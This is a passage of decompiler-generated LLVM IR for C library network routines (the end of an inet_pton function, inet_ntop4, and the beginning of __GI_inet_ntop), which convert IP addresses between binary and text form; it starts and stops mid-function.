  %v4_8056b29 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8056b29 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8056b29, label %dec_label_pc_8056b61, label %dec_label_pc_8056b30

dec_label_pc_8056b30:                             ; preds = %dec_label_pc_8056b29
  store i32 1, i32* @esi, align 4
  %v6_8056b37 = sub i32 %v0_8056b61.pre, %v4_8056b29
  store i32 %v6_8056b37, i32* @edi, align 4
  %v16_8056b3b = icmp eq i32 %v0_8056b61.pre, %v2_8056a12
  %v1_8056b3f = icmp eq i1 %v16_8056b3b, false
  br i1 %v1_8056b3f, label %dec_label_pc_8056b59.preheader, label %dec_label_pc_8056b92

dec_label_pc_8056b59.preheader:                   ; preds = %dec_label_pc_8056b30
  %v3_8056b5994 = inttoptr i32 %v6_8056b37 to i8*
  %v9_8056b5b97 = icmp slt i8* %v3_8056b5994, inttoptr (i32 1 to i8*)
  br i1 %v9_8056b5b97, label %dec_label_pc_8056b61.thread, label %dec_label_pc_8056b43

dec_label_pc_8056b43:                             ; preds = %dec_label_pc_8056b59.preheader, %dec_label_pc_8056b43
  %v0_8056b5199 = phi i32 [ %v0_8056b59.pre, %dec_label_pc_8056b43 ], [ 1, %dec_label_pc_8056b59.preheader ]
  %v0_8056b4398 = phi i32 [ %v1_8056b59.pre, %dec_label_pc_8056b43 ], [ %v6_8056b37, %dec_label_pc_8056b59.preheader ]
  %v2_8056b49 = sub i32 %v0_8056b4398, %v0_8056b5199
  %v2_8056b4b = sub i32 %v2_8056a12, %v0_8056b5199
  %v6_8056b4d = add i32 %v2_8056b49, %v4_8056b29
  store i32 %v6_8056b4d, i32* %eax.global-to-local, align 4
  %v1_8056b51 = add i32 %v0_8056b5199, 1
  store i32 %v1_8056b51, i32* @esi, align 4
  %v1_8056b52 = inttoptr i32 %v6_8056b4d to i8*
  %v2_8056b52 = load i8, i8* %v1_8056b52, align 1
  %v3_8056b52 = zext i8 %v2_8056b52 to i32
  %v4_8056b52 = load i32, i32* @edx, align 4
  %v5_8056b52 = and i32 %v4_8056b52, -256
  %v6_8056b52 = or i32 %v5_8056b52, %v3_8056b52
  store i32 %v6_8056b52, i32* @edx, align 4
  %v3_8056b54 = inttoptr i32 %v2_8056b4b to i8*
  store i8 %v2_8056b52, i8* %v3_8056b54, align 1
  %v0_8056b56 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b56 = inttoptr i32 %v0_8056b56 to i8*
  store i8 0, i8* %v1_8056b56, align 1
  %v0_8056b59.pre = load i32, i32* @esi, align 4
  %v1_8056b59.pre = load i32, i32* @edi, align 4
  %v2_8056b59 = inttoptr i32 %v0_8056b59.pre to i8*
  %v3_8056b59 = inttoptr i32 %v1_8056b59.pre to i8*
  %v9_8056b5b = icmp sgt i8* %v2_8056b59, %v3_8056b59
  br i1 %v9_8056b5b, label %dec_label_pc_8056b61.thread, label %dec_label_pc_8056b43

dec_label_pc_8056b61.thread:                      ; preds = %dec_label_pc_8056b43, %dec_label_pc_8056b59.preheader
  br label %dec_label_pc_8056b67

dec_label_pc_8056b61:                             ; preds = %dec_label_pc_8056b29
  %v16_8056b61 = icmp eq i32 %v0_8056b61.pre, %v2_8056a12
  %v1_8056b65 = icmp eq i1 %v16_8056b61, false
  br i1 %v1_8056b65, label %dec_label_pc_8056b92, label %dec_label_pc_8056b67

dec_label_pc_8056b67:                             ; preds = %dec_label_pc_8056b61.thread, %dec_label_pc_8056b61
  store i32 %v2_8056a06, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8056b73 = call i32 @memcpy(i16* %tmp63, i32 %v2_8056a06, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056b94

dec_label_pc_8056b82:                             ; preds = %dec_label_pc_80569e6
  %v1_8056b82 = call i32 @__errno_location(i32 %v0_80569d5)
  %v1_8056b87 = inttoptr i32 %v1_8056b82 to i32*
  store i32 97, i32* %v1_8056b87, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056b94

dec_label_pc_8056b92:                             ; preds = %dec_label_pc_8056a93, %dec_label_pc_8056a8a, %dec_label_pc_8056a4e, %dec_label_pc_8056a75, %dec_label_pc_8056b30, %dec_label_pc_8056ad4, %dec_label_pc_8056b61, %dec_label_pc_8056b12, %dec_label_pc_8056ac7, %dec_label_pc_8056abe, %dec_label_pc_8056a21
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056b94

dec_label_pc_8056b94:                             ; preds = %dec_label_pc_8056b82, %dec_label_pc_8056b67, %dec_label_pc_80569f1, %dec_label_pc_8056b92
  %v0_8056b9b = phi i32 [ -1, %dec_label_pc_8056b82 ], [ 1, %dec_label_pc_8056b67 ], [ %v3_80569f7, %dec_label_pc_80569f1 ], [ 0, %dec_label_pc_8056b92 ]
  store i32 %v0_80569d5, i32* @ebx, align 4
  store i32 %v0_80569d4, i32* @esi, align 4
  store i32 %v0_80569d3, i32* @edi, align 4
  store i32 %v0_80569d2, i32* @ebp, align 4
  ret i32 %v0_8056b9b

; uselistorder directives
  uselistorder i32 %v1_8056b59.pre, { 1, 0 }
  uselistorder i32 %v0_8056b59.pre, { 1, 0 }
  uselistorder i32 %v0_8056b5199, { 2, 1, 0 }
  uselistorder i32 %v0_8056b61.pre, { 2, 1, 0 }
  uselistorder i32 %v0_8056b61.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8056af9, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_8056a46, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_8056a12, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_80569d5, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8056b94, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056b92, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8056b67, { 1, 0 }
  uselistorder label %dec_label_pc_8056b43, { 1, 0 }
  uselistorder label %dec_label_pc_8056b29, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056af2, { 1, 0 }
  uselistorder label %dec_label_pc_8056ab2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056af2.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_8056b9d = load i32, i32* @edi, align 4
  %v0_8056b9e = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_8056ba6 = load i32, i32* @eax, align 4
  %v3_8056baa = and i32 %v0_8056ba6, -65536
  store i32 %v3_8056baa, i32* %stack_var_-33, align 4
  %v2_8056bb5 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8056bbb = load i32, i32* @edx, align 4
  %v5_8056bbb = inttoptr i32 %v0_8056bbb to i8*
  store i8* %v5_8056bbb, i8** %stack_var_-60, align 4
  %v0_8056bbf = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8056bc5 = add i32 %v2_8056bb5, 4
  store i32 %v6_8056bc5, i32* %edi.global-to-local, align 4
  %v2_8056bc6 = inttoptr i32 %v6_8056bc5 to i32*
  store i32 0, i32* %v2_8056bc6, align 4
  %v3_8056bc6 = load i32, i32* %edi.global-to-local, align 4
  %v6_8056bc6 = add i32 %v3_8056bc6, 4
  store i32 %v6_8056bc6, i32* %edi.global-to-local, align 4
  %v0_8056bc7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056bc7 = inttoptr i32 %v6_8056bc6 to i32*
  store i32 %v0_8056bc7, i32* %v2_8056bc7, align 4
  %v3_8056bc7 = load i32, i32* %edi.global-to-local, align 4
  %v6_8056bc7 = add i32 %v3_8056bc7, 4
  store i32 %v6_8056bc7, i32* %edi.global-to-local, align 4
  %v0_8056bc8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056bc8 = trunc i32 %v0_8056bc8 to i16
  %v3_8056bc8 = inttoptr i32 %v6_8056bc7 to i16*
  store i16 %v1_8056bc8, i16* %v3_8056bc8, align 2
  %v4_8056bc8 = load i32, i32* %edi.global-to-local, align 4
  %v7_8056bc8 = add i32 %v4_8056bc8, 2
  store i32 %v7_8056bc8, i32* %edi.global-to-local, align 4
  %v0_8056bca = load i32, i32* %eax.global-to-local, align 4
  %v1_8056bca = trunc i32 %v0_8056bca to i8
  %v3_8056bca = inttoptr i32 %v7_8056bc8 to i8*
  store i8 %v1_8056bca, i8* %v3_8056bca, align 1
  %v0_8056c5a26 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8056c5d29 = icmp sgt i32 %v0_8056c5a26, 3
  br i1 %v7_8056c5d29, label %dec_label_pc_8056c63, label %dec_label_pc_8056bd0

dec_label_pc_8056bd0:                             ; preds = %entry, %dec_label_pc_8056c38
  %v0_8056c5a30 = phi i32 [ %v0_8056c5a, %dec_label_pc_8056c38 ], [ %v0_8056c5a26, %entry ]
  %v0_8056bd4 = load i32, i32* @ecx, align 4
  %v1_8056bd4 = and i32 %v0_8056bd4, -256
  %v2_8056bd4 = or i32 %v1_8056bd4, 100
  store i32 %v2_8056bd4, i32* %ecx.global-to-local, align 4
  %v2_8056bd6 = add i32 %v0_8056c5a30, %v0_8056ba6
  store i32 %v2_8056bd6, i32* %eax.global-to-local, align 4
  %v0_8056bd8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056bd8 = add i32 %v0_8056bd8, 1
  store i32 %v1_8056bd8, i32* @esi, align 4
  store i32 %v0_8056bd8, i32* @edi, align 4
  %v1_8056be1 = inttoptr i32 %v2_8056bd6 to i8*
  %v2_8056be1 = load i8, i8* %v1_8056be1, align 1
  %v3_8056be1 = zext i8 %v2_8056be1 to i32
  %v4_8056be1 = load i32, i32* @edx, align 4
  %v5_8056be1 = and i32 %v4_8056be1, -65536
  %v6_8056be1 = or i32 %v5_8056be1, %v3_8056be1
  store i32 %v6_8056be1, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_8056be1, 100
  %v6_8056be7 = zext i8 %div to i32
  %v4_8056be9 = or i32 %v6_8056be7, %v1_8056bd4
  store i32 %v4_8056be9, i32* %ecx.global-to-local, align 4
  %v1_8056beb = or i32 %v4_8056be9, 48
  store i32 %v1_8056beb, i32* %eax.global-to-local, align 4
  %v1_8056bee = trunc i32 %v1_8056beb to i8
  %v2_8056bee = load i32, i32* @esp, align 4
  %v4_8056bee = add i32 %v0_8056bd8, 43
  %v5_8056bee = add i32 %v4_8056bee, %v2_8056bee
  %v6_8056bee = inttoptr i32 %v5_8056bee to i8*
  store i8 %v1_8056bee, i8* %v6_8056bee, align 1
  %v0_8056bf2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056bf2 = trunc i32 %v0_8056bf2 to i8
  %v7_8056bf2 = icmp eq i8 %v1_8056bf2, 48
  %v1_8056bf4 = icmp eq i1 %v7_8056bf2, false
  %v0_8056c1a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056c1a = and i32 %v0_8056c1a, -256
  %v2_8056c1a = or i32 %v1_8056c1a, 10
  store i32 %v2_8056c1a, i32* %ecx.global-to-local, align 4
  %v0_8056c1c = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8056c1c, i32* %eax.global-to-local, align 4
  %v3_8056c1e = trunc i32 %v0_8056c1c to i16
  %v5_8056c1e = udiv i16 %v3_8056c1e, 10
  br i1 %v1_8056bf4, label %dec_label_pc_8056c1a, label %dec_label_pc_8056bf6

dec_label_pc_8056bf6:                             ; preds = %dec_label_pc_8056bd0
  %v9_8056bfa = and i32 %v0_8056c1c, -65536
  %tmp = urem i16 %v5_8056c1e, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_8056c07 = zext i16 %div32 to i32
  %v11_8056c07 = or i32 %v7_8056c07, %v9_8056bfa
  store i32 %v11_8056c07, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_8056c07 = zext i16 %tmp34 to i32
  %v1_8056c0a = or i32 %v12_8056c07, 48
  %v8_8056c0a = trunc i32 %v1_8056c0a to i8
  store i32 %v1_8056c0a, i32* %edx.global-to-local, align 4
  %v2_8056c0d = load i32, i32* @esp, align 4
  %v3_8056c0d = load i32, i32* %ebx.global-to-local, align 4
  %v4_8056c0d = add i32 %v2_8056c0d, 43
  %v5_8056c0d = add i32 %v4_8056c0d, %v3_8056c0d
  %v6_8056c0d = inttoptr i32 %v5_8056c0d to i8*
  store i8 %v8_8056c0a, i8* %v6_8056c0d, align 1
  %v0_8056c11 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056c11 = trunc i32 %v0_8056c11 to i8
  %v7_8056c11 = icmp eq i8 %v1_8056c11, 48
  br i1 %v7_8056c11, label %dec_label_pc_8056c38, label %dec_label_pc_8056c16

dec_label_pc_8056c16:                             ; preds = %dec_label_pc_8056bf6
  %v0_8056c16 = load i32, i32* @esi, align 4
  store i32 %v0_8056c16, i32* @edi, align 4
  br label %dec_label_pc_8056c38

dec_label_pc_8056c1a:                             ; preds = %dec_label_pc_8056bd0
  %tmp35 = urem i16 %v5_8056c1e, 256
  %v3_8056c20 = and i32 %v0_8056c1c, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_8056c2b = zext i16 %div33 to i32
  %v11_8056c2b = or i32 %v7_8056c2b, %v3_8056c20
  store i32 %v11_8056c2b, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_8056c2b = zext i16 %tmp36 to i32
  %v1_8056c2e = or i32 %v12_8056c2b, 48
  %v8_8056c2e = trunc i32 %v1_8056c2e to i8
  store i32 %v1_8056c2e, i32* %edx.global-to-local, align 4
  %v0_8056c31 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c31 = add i32 %v0_8056c31, 2
  store i32 %v1_8056c31, i32* @edi, align 4
  %v2_8056c34 = load i32, i32* @esp, align 4
  %v3_8056c34 = load i32, i32* @esi, align 4
  %v4_8056c34 = add i32 %v2_8056c34, 43
  %v5_8056c34 = add i32 %v4_8056c34, %v3_8056c34
  %v6_8056c34 = inttoptr i32 %v5_8056c34 to i8*
  store i8 %v8_8056c2e, i8* %v6_8056c34, align 1
  br label %dec_label_pc_8056c38

dec_label_pc_8056c38:                             ; preds = %dec_label_pc_8056bf6, %dec_label_pc_8056c16, %dec_label_pc_8056c1a
  store i32 %v2_8056bd6, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_8056c41 = load i32, i32* @edi, align 4
  %v1_8056c41 = add i32 %v0_8056c41, 2
  store i32 %v1_8056c41, i32* %ebx.global-to-local, align 4
  %v0_8056c44 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8056c44 = add i32 %v0_8056c44, 1
  store i32 %v1_8056c44, i32* %ebp.global-to-local, align 4
  %v2_8056c45 = load i8, i8* %v1_8056be1, align 1
  %v3_8056c45 = zext i8 %v2_8056c45 to i32
  %v4_8056c45 = load i32, i32* %eax.global-to-local, align 4
  %v5_8056c45 = and i32 %v4_8056c45, -65536
  %v6_8056c45 = or i32 %v5_8056c45, %v3_8056c45
  store i32 %v6_8056c45, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8056c4b = load i32, i32* @esp, align 4
  %v2_8056c4b = add i32 %v0_8056c41, 44
  %v3_8056c4b = add i32 %v2_8056c4b, %v0_8056c4b
  %v4_8056c4b = inttoptr i32 %v3_8056c4b to i8*
  store i8 46, i8* %v4_8056c4b, align 1
  %v0_8056c50 = load i32, i32* @ecx, align 4
  %v1_8056c50 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056c50 = urem i32 %v1_8056c50, 65536
  %v3_8056c50 = load i32, i32* %edx.global-to-local, align 4
  %v4_8056c50 = mul i32 %v3_8056c50, 65536
  %v5_8056c50 = or i32 %v4_8056c50, %v2_8056c50
  %v6_8056c50 = urem i32 %v0_8056c50, 65536
  %v7_8056c50 = udiv i32 %v5_8056c50, %v6_8056c50
  %v8_8056c50 = urem i32 %v7_8056c50, 65536
  %v10_8056c50 = and i32 %v1_8056c50, -65536
  %v11_8056c50 = or i32 %v8_8056c50, %v10_8056c50
  store i32 %v11_8056c50, i32* %eax.global-to-local, align 4
  %v12_8056c50 = urem i32 %v5_8056c50, %v6_8056c50
  %v14_8056c50 = and i32 %v3_8056c50, -65536
  %v15_8056c50 = or i32 %v12_8056c50, %v14_8056c50
  %v1_8056c53 = add i32 %v15_8056c50, 48
  %v8_8056c53 = trunc i32 %v1_8056c53 to i8
  store i32 %v1_8056c53, i32* @edx, align 4
  %v2_8056c56 = load i32, i32* @esp, align 4
  %v3_8056c56 = load i32, i32* @edi, align 4
  %v4_8056c56 = add i32 %v2_8056c56, 43
  %v5_8056c56 = add i32 %v4_8056c56, %v3_8056c56
  %v6_8056c56 = inttoptr i32 %v5_8056c56 to i8*
  store i8 %v8_8056c53, i8* %v6_8056c56, align 1
  %v0_8056c5a = load i32, i32* %ebp.global-to-local, align 4
  %v7_8056c5d = icmp sgt i32 %v0_8056c5a, 3
  br i1 %v7_8056c5d, label %dec_label_pc_8056c63, label %dec_label_pc_8056bd0

dec_label_pc_8056c63:                             ; preds = %dec_label_pc_8056c38, %entry
  %v0_8056c63 = load i32, i32* @esp, align 4
  %v1_8056c63 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056c63 = add i32 %v0_8056c63, 42
  %v3_8056c63 = add i32 %v2_8056c63, %v1_8056c63
  %v4_8056c63 = inttoptr i32 %v3_8056c63 to i8*
  store i8 0, i8* %v4_8056c63, align 1
  %v2_8056c6b = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8056c6b, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_8056c70 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_8056c70, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_8056c70, %v0_8056bbf
  br i1 %tmp31, label %dec_label_pc_8056c7e, label %dec_label_pc_8056c8d

dec_label_pc_8056c7e:                             ; preds = %dec_label_pc_8056c63
  %v0_8056c7e = load i8*, i8** %stack_var_-92, align 4
  %v1_8056c7e = ptrtoint i8* %v0_8056c7e to i32
  %v2_8056c7e = call i32 @__errno_location(i32 %v1_8056c7e)
  %v1_8056c83 = inttoptr i32 %v2_8056c7e to i32*
  store i32 28, i32* %v1_8056c83, align 4
  br label %dec_label_pc_8056c9c

dec_label_pc_8056c8d:                             ; preds = %dec_label_pc_8056c63
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_8056c905 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8056c905, i32* %tmp25, align 4
  %v0_8056c94.cast = inttoptr i32 %v3_8056c905 to i8*
  %v4_8056c94 = call i32 @strcpy(i8* %v0_8056c94.cast, i32 %v2_8056c6b)
  br label %dec_label_pc_8056c9c

dec_label_pc_8056c9c:                             ; preds = %dec_label_pc_8056c7e, %dec_label_pc_8056c8d
  %storemerge = phi i32 [ %v4_8056c94, %dec_label_pc_8056c8d ], [ 0, %dec_label_pc_8056c7e ]
  %v0_8056ca3 = phi i32 [ %v4_8056c94, %dec_label_pc_8056c8d ], [ 0, %dec_label_pc_8056c7e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8056b9e, i32* @esi, align 4
  store i32 %v0_8056b9d, i32* @edi, align 4
  ret i32 %v0_8056ca3

; uselistorder directives
  uselistorder i32 %v0_8056c5a, { 1, 0 }
  uselistorder i32 %v3_8056c50, { 1, 0 }
  uselistorder i32 %v1_8056c50, { 1, 0 }
  uselistorder i32 %v1_8056c2e, { 1, 0 }
  uselistorder i32 %v1_8056c0a, { 1, 0 }
  uselistorder i32 %v0_8056c1c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8056beb, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 12, 14, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i32 43, { 3, 4, 5, 6, 1, 7, 2, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 100, { 7, 1, 5, 6, 2, 3, 4, 0 }
  uselistorder i32 -65536, { 3, 4, 5, 1, 0, 6, 7, 8, 12, 2, 9, 10, 11 }
  uselistorder i1* @df, { 5, 38, 39, 0, 1, 40, 41, 42, 47, 2, 3, 30, 4, 52, 53, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36, 37, 43, 44, 45, 46, 48, 49, 50, 51 }
  uselistorder label %dec_label_pc_8056c9c, { 1, 0 }
  uselistorder label %dec_label_pc_8056c38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056bd0, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8056ca5 = load i32, i32* @edi, align 4
  %v0_8056ca6 = load i32, i32* @esi, align 4
  %v0_8056ca7 = load i32, i32* @ebx, align 4
  %v15_8056ca8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8056caf = icmp eq i32 %arg1, 2
  br i1 %v9_8056caf, label %dec_label_pc_8056cbf, label %dec_label_pc_8056cb4

dec_label_pc_8056cb4:                             ; preds = %entry
  %v9_8056cb4 = icmp eq i32 %arg1, 10
  %v1_8056cb7 = icmp eq i1 %v9_8056cb4, false
  br i1 %v1_8056cb7, label %dec_label_pc_8056e5b, label %dec_label_pc_8056cd7

dec_label_pc_8056cbf:                             ; preds = %entry
  %v4_8056cbf = ptrtoint i8* %arg3 to i32
  store i32 %v4_8056cbf, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8056ccb = call i32 @inet_ntop4(i32 %v0_8056ca7, i32 %v0_8056ca6, i32 %v0_8056ca5)
  store i32 %v3_8056ccb, i32* %eax.global-to-local, align 4
  store i32 %v3_8056ccb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056e68

dec_label_pc_8056cd7:                             ; preds = %dec_label_pc_8056cb4
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8056cdc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8056cdc, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_8056ce1 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_8056ce1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8056d03 = add i32 %arg2, 1
  br label %dec_label_pc_8056ced

dec_label_pc_8056ced:                             ; preds = %dec_label_pc_8056ced.dec_label_pc_8056ced_crit_edge, %dec_label_pc_8056cd7
  %v1_8056d10 = phi i32 [ %v15_8056ca8, %dec_label_pc_8056cd7 ], [ %v1_8056d10.pre, %dec_label_pc_8056ced.dec_label_pc_8056ced_crit_edge ]
  %v0_8056d0b72 = phi i32 [ 0, %dec_label_pc_8056cd7 ], [ %v0_8056d14.pre, %dec_label_pc_8056ced.dec_label_pc_8056ced_crit_edge ]
  %v1_8056cf6 = ashr i32 %v0_8056d0b72, 31
  %v2_8056cf7 = zext i32 %v0_8056d0b72 to i64
  %v4_8056cf7 = zext i32 %v1_8056cf6 to i64
  %v5_8056cf7 = mul nuw i64 %v4_8056cf7, 4294967296
  %v6_8056cf7 = or i64 %v5_8056cf7, %v2_8056cf7
  %v8_8056cf7 = sdiv i64 %v6_8056cf7, 2
  %v9_8056cf7 = trunc i64 %v8_8056cf7 to i32
  store i32 %v9_8056cf7, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8056cf7, i32* %ebx.global-to-local, align 4
  %v2_8056cff = add i32 %v0_8056d0b72, %arg2
  %v3_8056cff = inttoptr i32 %v2_8056cff to i8*
  %v4_8056cff = load i8, i8* %v3_8056cff, align 1
  %v5_8056cff = zext i8 %v4_8056cff to i32
  store i32 %v5_8056cff, i32* %eax.global-to-local, align 4
  %v3_8056d03 = add i32 %v2_8056d03, %v0_8056d0b72
  %v4_8056d03 = inttoptr i32 %v3_8056d03 to i8*
  %v5_8056d03 = load i8, i8* %v4_8056d03, align 1
  %v6_8056d03 = zext i8 %v5_8056d03 to i32
  store i32 %v6_8056d03, i32* %edx.global-to-local, align 4
  %v2_8056d08 = mul nuw nsw i32 %v5_8056cff, 256
  %v1_8056d0b = add i32 %v0_8056d0b72, 2
  store i32 %v1_8056d0b, i32* %ecx.global-to-local, align 4
  %v2_8056d0e = or i32 %v6_8056d03, %v2_8056d08
  store i32 %v2_8056d0e, i32* %eax.global-to-local, align 4
  %v3_8056d10 = mul i32 %v9_8056cf7, 4
  %v4_8056d10 = add i32 %v3_8056d10, 60
  %v5_8056d10 = add i32 %v4_8056d10, %v1_8056d10
  %v6_8056d10 = inttoptr i32 %v5_8056d10 to i32*
  store i32 %v2_8056d0e, i32* %v6_8056d10, align 4
  %v0_8056d14.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8056d17 = icmp sgt i32 %v0_8056d14.pre, 15
  br i1 %v7_8056d17, label %dec_label_pc_8056d19, label %dec_label_pc_8056ced.dec_label_pc_8056ced_crit_edge

dec_label_pc_8056ced.dec_label_pc_8056ced_crit_edge: ; preds = %dec_label_pc_8056ced
  %v1_8056d10.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056ced

dec_label_pc_8056d19:                             ; preds = %dec_label_pc_8056ced
  %v4_8056cd7 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8056d23.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056d23

dec_label_pc_8056d23:                             ; preds = %dec_label_pc_8056d19, %dec_label_pc_8056d50
  %v0_8056d5071 = phi i32 [ 0, %dec_label_pc_8056d19 ], [ %v1_8056d50, %dec_label_pc_8056d50 ]
  %v0_8056d3b70 = phi i32 [ -1, %dec_label_pc_8056d19 ], [ %v0_8056d3b8, %dec_label_pc_8056d50 ]
  %v0_8056d5b69 = phi i32 [ -1, %dec_label_pc_8056d19 ], [ %v0_8056d409, %dec_label_pc_8056d50 ]
  %v0_8056d6668 = phi i32 [ -1, %dec_label_pc_8056d19 ], [ %v0_8056d4b13, %dec_label_pc_8056d50 ]
  %v2_8056d23 = mul nuw nsw i32 %v0_8056d5071, 4
  %v3_8056d23 = add nuw nsw i32 %v2_8056d23, 60
  %v4_8056d23 = add i32 %v3_8056d23, %v0_8056d23.pre
  %v5_8056d23 = inttoptr i32 %v4_8056d23 to i32*
  %v6_8056d23 = load i32, i32* %v5_8056d23, align 4
  %v7_8056d23 = icmp eq i32 %v6_8056d23, 0
  %v1_8056d28 = icmp eq i1 %v7_8056d23, false
  %v10_8056d3b = icmp eq i32 %v0_8056d3b70, -1
  br i1 %v1_8056d28, label %dec_label_pc_8056d3b, label %dec_label_pc_8056d2a

